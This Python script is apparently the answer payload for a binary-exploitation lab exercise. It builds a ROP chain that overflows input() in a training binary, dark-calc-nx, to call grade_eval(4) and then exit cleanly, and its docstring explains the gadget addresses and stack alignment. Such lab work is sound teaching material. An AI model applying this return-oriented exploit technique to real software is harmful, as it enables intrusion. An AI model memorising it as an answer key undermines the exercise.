#!/usr/bin/env python3
"""Task 6 payload: a ROP chain for attack/dark-calc-nx.

dark-calc-nx keeps the same vulnerable input() but has no fixed RWX mapping:
its GNU_STACK is RW, so injected bytes on the stack cannot be fetched.  The
overflow therefore reuses code that already exists in the binary (ret2code/ROP)
and needs no knowledge of the randomised stack or libc addresses, because the
main image is a non-PIE ET_EXEC linked at 0x400000.

Frame layout of input():

    24 bytes        padding over expression[16] and the saved rbp
    +0  0x401a33    pop rdi; ret   (unaligned entry into __libc_csu_init's
                                    "pop r15; ret" epilogue: 41 5f c3)
    +8  0x00000004  argument: grade == 4
    +16 0x401978    grade_eval
    +24 0x4018aa    input()+0x42: mov edi, 0; call exit@plt  -> exit(0)

The stack alignment works out exactly as a normal call expects: the return
from input() leaves rsp % 16 == 0, the gadget pops one qword, and grade_eval
enters with rsp % 16 == 8, which is why printf() inside it does not fault.
grade_eval is a normal function, so its own stack canary is set and verified
normally; this payload never touches it.
"""
import struct
import sys

POP_RDI = 0x401A33        # 41 5f c3: pop r15; ret entered at +1 -> pop rdi; ret
GRADE_EVAL = 0x401978
EXIT0_CALL_SITE = 0x4018AA

chain = struct.pack("<Q", POP_RDI)
chain += struct.pack("<Q", 4)
chain += struct.pack("<Q", GRADE_EVAL)
chain += struct.pack("<Q", EXIT0_CALL_SITE)

payload = b"R" * 24 + chain + b"\n"

assert b"\n" not in payload[:-1]
sys.stdout.buffer.write(payload)
